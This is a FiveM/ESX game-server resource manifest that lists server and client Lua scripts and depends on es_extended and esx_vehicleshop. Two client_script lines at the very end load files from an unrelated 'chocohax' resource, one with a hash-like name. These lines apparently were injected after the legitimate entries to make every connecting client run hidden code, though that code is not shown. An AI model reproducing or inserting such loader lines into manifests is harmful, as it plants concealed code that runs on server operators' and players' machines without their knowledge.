resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'made by MEENO'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'server/main.lua',
	'config.lua',
	'locales/tw.lua',
	'locales/en.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'client/main.lua',
	'config.lua',
	'locales/tw.lua',
	'locales/en.lua'
}

dependency {
	'es_extended',
	'esx_vehicleshop'
}
client_script '@chocohax/95158.lua'
client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'